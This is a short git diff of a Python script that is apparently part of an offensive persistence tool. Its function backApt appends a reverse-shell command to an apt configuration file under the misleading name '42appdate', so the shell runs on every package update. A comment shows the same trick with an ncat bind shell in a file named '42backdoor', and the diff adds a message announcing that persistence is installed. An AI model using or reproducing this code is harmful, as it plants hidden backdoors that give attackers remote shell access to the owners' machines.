@@ -17,6 +17,8 @@ def setuid():
 #echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};'
 #> /etc/apt/apt.conf.d/42backdoor
 def backApt():
-    with open('/etc/apt/apt.conf.d/42appdate','a') as file:
+    path = '/etc/apt/apt.conf.d/42appdate'
+    with open(path,'a') as file:
         code = reverse.reverse(False)
         file.write(f'APT::Update::Pre-Invoke {{"{code}"}};')
+        pGood(f"Persistance installed in {path}")
